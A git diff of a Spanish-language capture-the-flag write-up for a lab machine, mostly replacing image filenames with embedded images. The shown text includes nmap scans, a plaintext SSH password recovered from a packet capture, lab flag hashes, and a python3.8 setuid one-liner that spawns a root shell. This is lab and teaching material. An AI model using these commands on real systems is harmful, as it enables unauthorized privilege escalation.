@@ -24,7 +24,8 @@ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -v 10.129.40.145
 ```
 
 Encontramos 3 puertos abiertos, con esta la primera pregunta.
-Pasted image 20260423213641.png
+<img width="656" height="367" alt="Pasted image 20260423213641" src="https://github.com/user-attachments/assets/1d9e8ce0-1f40-4142-85bc-5b132a42035c" />
+
 
 Luego de ver los puertos abiertos realizamos un escaneo dirigido hacia ellos:
 
@@ -33,7 +34,7 @@ sudo nmap -p 21,22,80 -sC -sV -n -Pn 10.129.40.145
 ```
 
 Nos encuentra la siguiente información sobre los puertos:
-Pasted image 20260423214214.png
+<img width="779" height="332" alt="Pasted image 20260423214214" src="https://github.com/user-attachments/assets/519fe00c-d615-4dbd-ade5-42cbfee75a3d" />
 
 ```
 3
@@ -42,7 +43,7 @@ Pasted image 20260423214214.png
 ### Pregunta 2
 
 Ingresamos por HTTP a la IP 10.129.40.145, dentro nos dirigimos al apartado "Security Snapshot", esperamos que cargue y en pantalla tendremos la respuesta a la segunda pregunta.
-Pasted image 20260423222007.png
+<img width="959" height="112" alt="Pasted image 20260423222007" src="https://github.com/user-attachments/assets/d8ba52a5-c5e9-423b-a061-caa462f2da7b" />
 
 ```
 data
@@ -58,8 +59,8 @@ yes
 
 ### Pregunta 4
 
-*Revisamos las capturas de red creadas en la sección data, vemos que en el archivo de datos 0, se encuentran unos datos interesantes:
-Pasted image 20260424201206.png
+Revisamos las capturas de red creadas en la sección data, vemos que en el archivo de datos 0, se encuentran unos datos interesantes:
+<img width="1914" height="638" alt="Pasted image 20260424201206" src="https://github.com/user-attachments/assets/37262c79-a9d2-4715-87cd-9ba960956d39" />
 
 ```
 0
@@ -90,7 +91,8 @@ ssh nathan@10.129.41.181
 ```
 
 Buck3tH4TF0RM3!
-Pasted image 20260424202211.png
+<img width="460" height="117" alt="Pasted image 20260424202211" src="https://github.com/user-attachments/assets/cb92418b-18c1-4d54-b034-038322d920ed" />
+
 
 ```
 9dea9b3c3e4728162b7bdcc19da46ec7
@@ -105,25 +107,27 @@ getcap -r / 2>/dev/null
 ```
 
 Nos muestra los siguientes binarios con permisos específicos.
-Pasted image 20260424204001.png
+<img width="869" height="117" alt="Pasted image 20260424204001" src="https://github.com/user-attachments/assets/e95c2e31-0ac8-4aa7-aae8-a59953f6f261" />
+
 /usr/bin/python3.8
 
 ### Bandera de Administrador
 
 Usando la herramienta searchbins buscamos un payload de escalada de privilegios para el binario python3.
-Pasted image 20260424210748.png
+<img width="731" height="170" alt="Pasted image 20260424210748" src="https://github.com/user-attachments/assets/fb71155e-3e78-48b2-9944-ef265d2cd5a7" />
 
 Modificamos el payload para nuestro uso y lo ejecutamos en la terminal:
 
 ```bash
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
-Pasted image 20260424211122.png
+<img width="681" height="52" alt="Pasted image 20260424211122" src="https://github.com/user-attachments/assets/c2b0c843-e2af-44fc-8835-75ed9416da15" />
 
 Escalamos a root!
 
 Ahora buscaremos la bandera:
-Pasted image 20260424211538.png
+<img width="638" height="168" alt="Pasted image 20260424211538" src="https://github.com/user-attachments/assets/380566aa-d726-4d2f-9446-bdcb11857b3d" />
+
 
 ```
 1a937e93778fda81d947433c7f7bdd95
